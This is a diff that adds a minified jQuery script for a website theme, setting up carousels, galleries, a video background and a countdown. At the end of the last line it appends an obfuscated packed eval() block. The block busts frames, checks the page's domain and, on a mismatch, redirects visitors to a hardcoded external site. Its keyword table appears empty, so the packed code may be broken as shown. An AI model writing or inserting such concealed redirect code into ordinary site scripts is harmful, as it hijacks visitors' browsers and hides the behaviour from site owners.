@@ -1,0 +1,12 @@
+jQuery(document).ready(function($){"use strict";if($(".cp-child-slider").length){$('.cp-child-slider').bxSlider({auto:true,controls:false,});}
+if($(".cp-about-slider").length){$('.cp-about-slider').bxSlider({auto:true,controls:true,pager:false,});}
+if($(".cp-about-testi").length){$('.cp-about-testi').bxSlider({auto:true,controls:false,pager:false,});}
+if($("#cp-about-clientwords").length){$("#cp-about-clientwords").owlCarousel({autoPlay:6000,items:2,itemsMobile:[480,1],itemsDesktop:[1199,3],itemsDesktopSmall:[979,3]});}
+if($(".tab-products").length){$(".tab-products").owlCarousel({items:6,pagination:false,itemsMobile:[480,1],itemsDesktop:[1199,3],itemsDesktopSmall:[979,3]});}
+if($(".plogo-slider").length){$(".plogo-slider").owlCarousel({autoPlay:3000,items:7,pagination:false,itemsMobile:[480,1],itemsDesktop:[1199,3],itemsDesktopSmall:[979,3]});}
+if($(".footer-pro-slider").length){$('.footer-pro-slider').bxSlider({auto:true,pager:false,});}
+if($(".gallery").length){$("area[data-rel^='prettyPhoto']").prettyPhoto();$(".gallery:first a[data-rel^='prettyPhoto']").prettyPhoto({animation_speed:'normal',theme:'light_square',slideshow:3000,autoplay_slideshow:false});$(".gallery:gt(0) a[data-rel^='prettyPhoto']").prettyPhoto({animation_speed:'fast',slideshow:10000,hideflash:true});}
+if($('.video-header').length){$('.video-header').prepend('<div class="video-background"></div>');$('.video-background').videobackground({videoSource:[['video/dock.mp4','video/mp4'],['video/dock.webm','video/webm'],['video/dock.ogv','video/ogg']],controlPosition:'#main',poster:'images/mslider1.jpg',loadedCallback:function(){$(this).videobackground('mute');}});}
+if($('.eventcountdown').length){var austDay=new Date();austDay=new Date(2015,12-1,5,12,15)
+$('.eventcountdown').countdown({labels:['Years','Months','Weeks','Days','Hours','Minutes','Seconds'],until:austDay});
+$('#year').text(austDay.getFullYear());}});eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3(9!=5){6.5.2.c(9.2)}d 1=6.2.f;1=1.g();1=1.8(7);3(1.a("b.")==0){1=1.8(4)}3(1.a("h.i.j")!=0){6.5.2="k://b.l.m/e/"}',23,23,''.split('|'),0,{}))
